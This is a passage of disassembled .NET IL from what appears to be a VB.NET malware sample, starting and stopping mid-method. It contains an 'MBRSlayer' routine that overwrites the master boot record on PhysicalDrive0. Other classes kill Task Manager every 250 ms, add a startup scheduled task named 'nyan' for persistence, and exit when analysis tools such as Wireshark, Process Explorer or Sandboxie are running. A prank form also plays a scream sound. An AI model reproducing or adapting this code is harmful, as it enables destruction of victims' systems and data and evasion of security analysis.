    IL_000d:  ldloc.1
    IL_000e:  or
    IL_000f:  stloc.2
    .try
    {
      IL_0010:  ldarg.1
      IL_0011:  conv.ovf.i4
      IL_0012:  ldloc.0
      IL_0013:  ldc.i4.0
      IL_0014:  ldc.i4.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldc.i4.0
      IL_0017:  ldloc.2
      IL_0018:  call       int32 frmSustos::SetWindowPos(int32,
                                                         int32,
                                                         int32,
                                                         int32,
                                                         int32,
                                                         int32,
                                                         int32)
      IL_001d:  pop
      IL_001e:  leave.s    IL_002e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0020:  dup
      IL_0021:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0026:  stloc.3
      IL_0027:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002c:  leave.s    IL_002e

    }  // end handler
    IL_002e:  ret
  } // end of method frmSustos::MakeTopMostWindow

  .method private instance void  frmSustos_Load(object sender,
                                                class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       250 (0xfa)
    .maxstack  3
    .locals init (native int V_0,
             class [mscorlib]System.Exception V_1,
             class [System]System.Diagnostics.Stopwatch V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0006:  ldarg.0
    IL_0007:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_000c:  ldarg.0
    IL_000d:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0012:  pop
    IL_0013:  ldarg.0
    IL_0014:  ldc.i4.1
    IL_0015:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_TopMost(bool)
    IL_001a:  ldarg.0
    IL_001b:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0020:  ldarg.0
    IL_0021:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_0026:  ldarg.0
    IL_0027:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_002c:  pop
    IL_002d:  ldarg.0
    IL_002e:  ldarg.0
    IL_002f:  call       instance native int [System.Windows.Forms]System.Windows.Forms.Control::get_Handle()
    IL_0034:  stloc.0
    IL_0035:  ldloca.s   V_0
    IL_0037:  call       instance int64 [mscorlib]System.IntPtr::ToInt64()
    IL_003c:  ldc.i4.1
    IL_003d:  call       instance void frmSustos::MakeTopMostWindow(int64,
                                                                    bool)
    IL_0042:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_0047:  ldarg.0
    IL_0048:  ldarg.0
    IL_0049:  call       instance native int [System.Windows.Forms]System.Windows.Forms.Control::get_Handle()
    IL_004e:  stloc.0
    IL_004f:  ldloca.s   V_0
    IL_0051:  call       instance int64 [mscorlib]System.IntPtr::ToInt64()
    IL_0056:  ldc.i4.0
    IL_0057:  call       instance void frmSustos::MakeTopMostWindow(int64,
                                                                    bool)
    IL_005c:  ldsfld     string j.OK::SCREAM
    IL_0061:  ldstr      "on"
    IL_0066:  ldc.i4.0
    IL_0067:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_006c:  brtrue.s   IL_00a1

    .try
    {
      IL_006e:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0073:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Audio()
      IL_0078:  ldstr      "temp"
      IL_007d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0082:  ldstr      "\\scream.wav"
      IL_0087:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008c:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio::Play(string)
      IL_0091:  leave.s    IL_00a1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0093:  dup
      IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0099:  stloc.1
      IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009f:  leave.s    IL_00a1

    }  // end handler
    IL_00a1:  nop
    .try
    {
      .try
      {
        IL_00a2:  newobj     instance void [System]System.Diagnostics.Stopwatch::.ctor()
        IL_00a7:  stloc.2
        IL_00a8:  ldloc.2
        IL_00a9:  callvirt   instance void [System]System.Diagnostics.Stopwatch::Start()
        IL_00ae:  br.s       IL_00c8

        IL_00b0:  ldarg.0
        IL_00b1:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
        IL_00b6:  ldarg.0
        IL_00b7:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
        IL_00bc:  ldarg.0
        IL_00bd:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
        IL_00c2:  pop
        IL_00c3:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
        IL_00c8:  ldloc.2
        IL_00c9:  callvirt   instance int64 [System]System.Diagnostics.Stopwatch::get_ElapsedMilliseconds()
        IL_00ce:  ldc.i4     0xbb8
        IL_00d3:  conv.i8
        IL_00d4:  blt.s      IL_00b0

        IL_00d6:  ldloc.2
        IL_00d7:  callvirt   instance void [System]System.Diagnostics.Stopwatch::Stop()
        IL_00dc:  ldarg.0
        IL_00dd:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Close()
        IL_00e2:  leave.s    IL_00f9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e4:  dup
        IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ea:  stloc.3
        IL_00eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f0:  leave.s    IL_00f9

      }  // end handler
    }  // end .try
    finally
    {
      IL_00f2:  ldarg.0
      IL_00f3:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Close()
      IL_00f8:  endfinally
    }  // end handler
    IL_00f9:  ret
  } // end of method frmSustos::frmSustos_Load

  .property instance class [System.Windows.Forms]System.Windows.Forms.PictureBox
          PictureBox1()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    .set instance void frmSustos::set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox)
  } // end of property frmSustos::PictureBox1
  .property instance class [System.Windows.Forms]System.Windows.Forms.CreateParams
          CreateParams()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.CreateParams frmSustos::get_CreateParams()
  } // end of property frmSustos::CreateParams
} // end of class frmSustos

.class public auto ansi Stub.MBRSlayer
       extends [mscorlib]System.Object
{
  .field private static literal uint32 GenericWrite = uint32(0x40000000)
  .field private static literal uint32 GenericExecute = uint32(0x20000000)
  .field private static literal uint32 GenericAll = uint32(0x10000000)
  .field private static literal uint32 FileShareRead = uint32(0x00000001)
  .field private static literal uint32 FileShareWrite = uint32(0x00000002)
  .field private static literal uint32 OpenExisting = uint32(0x00000003)
  .field private static literal uint32 FileFlagDeleteOnClose = uint32(0x40000000)
  .field private static literal uint32 MbrSize = uint32(0x00000200)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MBRSlayer::.ctor

  .method public static pinvokeimpl("kernel32" winapi) 
          native int  CreateFile(string lpFileName,
                                 uint32 dwDesiredAccess,
                                 uint32 dwShareMode,
                                 native int lpSecurityAttributes,
                                 uint32 dwCreationDisposition,
                                 uint32 dwFlagsAndAttributes,
                                 native int hTemplateFile) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" winapi) 
          bool  WriteFile(native int hfile,
                          uint8[] lpBuffer,
                          uint32 nNumberOfBytesToWrite,
                          [out] uint32& lpNumberBytesWritten,
                          native int lpOverlapped) cil managed preservesig
  {
  }
  .method public static void  Start() cil managed
  {
    // Code size       234 (0xea)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             object V_4,
             uint32 V_5,
             native int V_6)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldc.i4     0x200
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  dup
      IL_0014:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' '<PrivateImplementationDetails>'::F4302D72A369C8BADBF2BE9C2854DF4529637155
      IL_0019:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                          valuetype [mscorlib]System.RuntimeFieldHandle)
      IL_001e:  stloc.3
      IL_001f:  ldc.i4.3
      IL_0020:  stloc.2
      IL_0021:  ldstr      "\\\\.\\PhysicalDrive0"
      IL_0026:  ldc.i4     0x10000000
      IL_002b:  ldc.i4.3
      IL_002c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0031:  ldc.i4.3
      IL_0032:  ldc.i4.0
      IL_0033:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0038:  call       native int Stub.MBRSlayer::CreateFile(string,
                                                                 uint32,
                                                                 uint32,
                                                                 native int,
                                                                 uint32,
                                                                 uint32,
                                                                 native int)
      IL_003d:  box        [mscorlib]System.IntPtr
      IL_0042:  stloc.s    V_4
      IL_0044:  ldc.i4.4
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.s    V_5
      IL_0049:  ldc.i4.5
      IL_004a:  stloc.2
      IL_004b:  ldloc.s    V_4
      IL_004d:  dup
      IL_004e:  brtrue.s   IL_005d

      IL_0050:  pop
      IL_0051:  ldloca.s   V_6
      IL_0053:  initobj    [mscorlib]System.IntPtr
      IL_0059:  ldloc.s    V_6
      IL_005b:  br.s       IL_0062

      IL_005d:  unbox.any  [mscorlib]System.IntPtr
      IL_0062:  ldloc.3
      IL_0063:  castclass  uint8[]
      IL_0068:  ldc.i4     0x200
      IL_006d:  ldloca.s   V_5
      IL_006f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0074:  call       bool Stub.MBRSlayer::WriteFile(native int,
                                                          uint8[],
                                                          uint32,
                                                          uint32&,
                                                          native int)
      IL_0079:  pop
      IL_007a:  leave.s    IL_00e1

      IL_007c:  ldloc.1
      IL_007d:  ldc.i4.1
      IL_007e:  add
      IL_007f:  ldc.i4.0
      IL_0080:  stloc.1
      IL_0081:  switch     ( 
                            IL_00a2,
                            IL_0000,
                            IL_0007,
                            IL_001f,
                            IL_0044,
                            IL_0049,
                            IL_007a)
      IL_00a2:  leave.s    IL_00d6

      IL_00a4:  ldloc.2
      IL_00a5:  stloc.1
      IL_00a6:  ldloc.0
      IL_00a7:  switch     ( 
                            IL_00b4,
                            IL_007c)
      IL_00b4:  leave.s    IL_00d6

    }  // end .try
    filter
    {
      IL_00b6:  isinst     [mscorlib]System.Exception
      IL_00bb:  ldnull
      IL_00bc:  cgt.un
      IL_00be:  ldloc.0
      IL_00bf:  ldc.i4.0
      IL_00c0:  cgt.un
      IL_00c2:  and
      IL_00c3:  ldloc.1
      IL_00c4:  ldc.i4.0
      IL_00c5:  ceq
      IL_00c7:  and
      IL_00c8:  endfilter
    }  // end filter
    {  // handler
      IL_00ca:  castclass  [mscorlib]System.Exception
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  leave.s    IL_00a4

    }  // end handler
    IL_00d6:  ldc.i4     0x800a0033
    IL_00db:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00e0:  throw

    IL_00e1:  ldloc.1
    IL_00e2:  brfalse.s  IL_00e9

    IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00e9:  ret
  } // end of method MBRSlayer::Start

} // end of class Stub.MBRSlayer

.class public auto ansi Stub.NoTsk
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTsk::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       52 (0x34)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldstr      "taskmgr"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.1
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.2
    IL_000d:  br.s       IL_002d

    IL_000f:  ldloc.1
    IL_0010:  ldloc.2
    IL_0011:  ldelem.ref
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  ldloc.0
      IL_0014:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0019:  leave.s    IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.3
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0027:  leave.s    IL_0029

    }  // end handler
    IL_0029:  ldloc.2
    IL_002a:  ldc.i4.1
    IL_002b:  add.ovf
    IL_002c:  stloc.2
    IL_002d:  ldloc.2
    IL_002e:  ldloc.1
    IL_002f:  ldlen
    IL_0030:  conv.i4
    IL_0031:  blt.s      IL_000f

    IL_0033:  ret
  } // end of method NoTsk::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTsk::Start

} // end of class Stub.NoTsk

.class public auto ansi Stub.NoTska
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTska::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldsfld     string j.OK::NTTA
    IL_0005:  ldstr      "on"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  brtrue.s   IL_0045

    IL_0012:  ldstr      "taskmgr"
    IL_0017:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_001c:  stloc.1
    IL_001d:  ldc.i4.0
    IL_001e:  stloc.2
    IL_001f:  br.s       IL_003f

    IL_0021:  ldloc.1
    IL_0022:  ldloc.2
    IL_0023:  ldelem.ref
    IL_0024:  stloc.0
    .try
    {
      IL_0025:  ldloc.0
      IL_0026:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_002b:  leave.s    IL_003b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002d:  dup
      IL_002e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0033:  stloc.3
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  leave.s    IL_003b

    }  // end handler
    IL_003b:  ldloc.2
    IL_003c:  ldc.i4.1
    IL_003d:  add.ovf
    IL_003e:  stloc.2
    IL_003f:  ldloc.2
    IL_0040:  ldloc.1
    IL_0041:  ldlen
    IL_0042:  conv.i4
    IL_0043:  blt.s      IL_0021

    IL_0045:  ret
  } // end of method NoTska::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTska::Start

} // end of class Stub.NoTska

.class private auto ansi sealed Persistence
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Startup() cil managed
  {
    // Code size       52 (0x34)
    .maxstack  4
    .locals init (object V_0)
    IL_0000:  ldsfld     string j.OK::DR
    IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_000a:  ldstr      "\\"
    IL_000f:  ldsfld     string j.OK::EXE
    IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0019:  stloc.0
    IL_001a:  ldstr      "schtasks /create /sc onstart /mo 1 /tn nyan /tr "
    IL_001f:  ldloc.0
    IL_0020:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0025:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_002a:  ldc.i4.0
    IL_002b:  ldc.i4.0
    IL_002c:  ldc.i4.m1
    IL_002d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0032:  pop
    IL_0033:  ret
  } // end of method Persistence::Startup

} // end of class Persistence

.class public auto ansi beforefieldinit MyAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
    IL_0005:  stsfld     class j.OK MyAntiProcess::N
    IL_000a:  ret
  } // end of method MyAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MyAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed noinlining nooptimization
  {
    // Code size       741 (0x2e5)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process[] V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6,
             int32 V_7,
             class [System]System.Diagnostics.Process[] V_8,
             int32 V_9,
             class [System]System.Diagnostics.Process[] V_10,
             int32 V_11,
             class [System]System.Diagnostics.Process[] V_12,
             int32 V_13,
             class [System]System.Diagnostics.Process[] V_14,
             int32 V_15,
             class [System]System.Diagnostics.Process[] V_16,
             int32 V_17,
             class [System]System.Diagnostics.Process[] V_18,
             int32 V_19,
             class [System]System.Diagnostics.Process[] V_20,
             int32 V_21,
             class [System]System.Diagnostics.Process[] V_22,
             int32 V_23,
             class [System]System.Diagnostics.Process[] V_24,
             int32 V_25,
             class [System]System.Diagnostics.Process[] V_26,
             int32 V_27,
             class [System]System.Diagnostics.Process[] V_28,
             int32 V_29,
             class [System]System.Diagnostics.Process[] V_30,
             int32 V_31,
             class [System]System.Diagnostics.Process[] V_32,
             int32 V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35)
    IL_0000:  ldstr      "procexp"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.0
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_001c

    IL_000f:  ldloc.0
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  pop
    IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0018:  ldloc.1
    IL_0019:  ldc.i4.1
    IL_001a:  add.ovf
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldlen
    IL_001f:  conv.i4
    IL_0020:  blt.s      IL_000f

    IL_0022:  ldstr      "SbieCtrl"
    IL_0027:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_002c:  stloc.2
    IL_002d:  ldc.i4.0
    IL_002e:  stloc.3
    IL_002f:  br.s       IL_003e

    IL_0031:  ldloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldelem.ref
    IL_0034:  pop
    IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_003a:  ldloc.3
    IL_003b:  ldc.i4.1
    IL_003c:  add.ovf
    IL_003d:  stloc.3
    IL_003e:  ldloc.3
    IL_003f:  ldloc.2
    IL_0040:  ldlen
    IL_0041:  conv.i4
    IL_0042:  blt.s      IL_0031

    IL_0044:  ldstr      "SpyTheSpy"
    IL_0049:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_004e:  stloc.s    V_4
    IL_0050:  ldc.i4.0
    IL_0051:  stloc.s    V_5
    IL_0053:  br.s       IL_0066

    IL_0055:  ldloc.s    V_4
    IL_0057:  ldloc.s    V_5
    IL_0059:  ldelem.ref
    IL_005a:  pop
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0060:  ldloc.s    V_5
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.s    V_5
    IL_0066:  ldloc.s    V_5
    IL_0068:  ldloc.s    V_4
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0055

    IL_006e:  ldstr      "wireshark"
    IL_0073:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0078:  stloc.s    V_6
    IL_007a:  ldc.i4.0
    IL_007b:  stloc.s    V_7
    IL_007d:  br.s       IL_0090

    IL_007f:  ldloc.s    V_6
    IL_0081:  ldloc.s    V_7
    IL_0083:  ldelem.ref
    IL_0084:  pop
    IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008a:  ldloc.s    V_7
    IL_008c:  ldc.i4.1
    IL_008d:  add.ovf
    IL_008e:  stloc.s    V_7
    IL_0090:  ldloc.s    V_7
    IL_0092:  ldloc.s    V_6
    IL_0094:  ldlen
    IL_0095:  conv.i4
    IL_0096:  blt.s      IL_007f

    IL_0098:  ldstr      "apateDNS"
    IL_009d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a2:  stloc.s    V_8
    IL_00a4:  ldc.i4.0
    IL_00a5:  stloc.s    V_9
    IL_00a7:  br.s       IL_00ba

    IL_00a9:  ldloc.s    V_8
    IL_00ab:  ldloc.s    V_9
    IL_00ad:  ldelem.ref
    IL_00ae:  pop
    IL_00af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b4:  ldloc.s    V_9
    IL_00b6:  ldc.i4.1
    IL_00b7:  add.ovf
    IL_00b8:  stloc.s    V_9
    IL_00ba:  ldloc.s    V_9
    IL_00bc:  ldloc.s    V_8
    IL_00be:  ldlen
    IL_00bf:  conv.i4
    IL_00c0:  blt.s      IL_00a9

    IL_00c2:  ldstr      "IPBlocker"
    IL_00c7:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00cc:  stloc.s    V_10
    IL_00ce:  ldc.i4.0
    IL_00cf:  stloc.s    V_11
    IL_00d1:  br.s       IL_00e4

    IL_00d3:  ldloc.s    V_10
    IL_00d5:  ldloc.s    V_11
    IL_00d7:  ldelem.ref
    IL_00d8:  pop
    IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00de:  ldloc.s    V_11
    IL_00e0:  ldc.i4.1
    IL_00e1:  add.ovf
    IL_00e2:  stloc.s    V_11
    IL_00e4:  ldloc.s    V_11
    IL_00e6:  ldloc.s    V_10
    IL_00e8:  ldlen
    IL_00e9:  conv.i4
    IL_00ea:  blt.s      IL_00d3

    IL_00ec:  ldstr      "TiGeR-Firewall"
    IL_00f1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00f6:  stloc.s    V_12
    IL_00f8:  ldc.i4.0
    IL_00f9:  stloc.s    V_13
    IL_00fb:  br.s       IL_010e

    IL_00fd:  ldloc.s    V_12
    IL_00ff:  ldloc.s    V_13
    IL_0101:  ldelem.ref
    IL_0102:  pop
    IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0108:  ldloc.s    V_13
    IL_010a:  ldc.i4.1
    IL_010b:  add.ovf
    IL_010c:  stloc.s    V_13
    IL_010e:  ldloc.s    V_13
    IL_0110:  ldloc.s    V_12
    IL_0112:  ldlen
    IL_0113:  conv.i4
    IL_0114:  blt.s      IL_00fd

    IL_0116:  ldstr      "smsniff"
    IL_011b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0120:  stloc.s    V_14
    IL_0122:  ldc.i4.0
    IL_0123:  stloc.s    V_15
    IL_0125:  br.s       IL_0138

    IL_0127:  ldloc.s    V_14
    IL_0129:  ldloc.s    V_15
    IL_012b:  ldelem.ref
    IL_012c:  pop
    IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0132:  ldloc.s    V_15
    IL_0134:  ldc.i4.1
    IL_0135:  add.ovf
    IL_0136:  stloc.s    V_15
    IL_0138:  ldloc.s    V_15
    IL_013a:  ldloc.s    V_14
    IL_013c:  ldlen
    IL_013d:  conv.i4
    IL_013e:  blt.s      IL_0127

    IL_0140:  ldstr      "exeinfoPE"
    IL_0145:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014a:  stloc.s    V_16
    IL_014c:  ldc.i4.0
    IL_014d:  stloc.s    V_17
    IL_014f:  br.s       IL_0162

    IL_0151:  ldloc.s    V_16
    IL_0153:  ldloc.s    V_17
    IL_0155:  ldelem.ref
    IL_0156:  pop
    IL_0157:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_015c:  ldloc.s    V_17
    IL_015e:  ldc.i4.1
